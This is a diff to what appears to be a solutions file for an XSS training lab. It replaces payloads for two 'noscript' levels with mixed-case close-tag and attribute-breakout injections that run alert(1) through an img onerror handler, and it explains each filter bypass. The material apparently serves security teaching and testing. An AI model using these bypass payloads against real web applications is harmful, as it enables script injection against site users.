@@ -18,14 +18,14 @@ Reflections inside <noscript> elements and related mutation/breakout tricks.
 
 ### noscript-level3
 
-`/noscript/level3/?query=%3CNoScript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`
+`/noscript/level3/?query=%3C/NOSCRIPT%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<NoScript><script>alert(1)</script>`
-- context: only literal lowercase <noscript> stripped; mixed case bypass
+- payload: `</NOSCRIPT><img src=x onerror=alert(1)>`
+- context: only lowercase noscript tags are stripped; a mixed-case close tag escapes the raw text
 
 ### noscript-level4
 
-`/noscript/level4/?query=javascript%3Aalert(1)`
+`/noscript/level4/?query=x'%3E%3C/noscript%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: inside <meta http-equiv=refresh content="0;url=QUERY"> in noscript
+- payload: `x'></noscript><img src=x onerror=alert(1)>`
+- context: meta refresh inside noscript never runs; close the attribute and the noscript
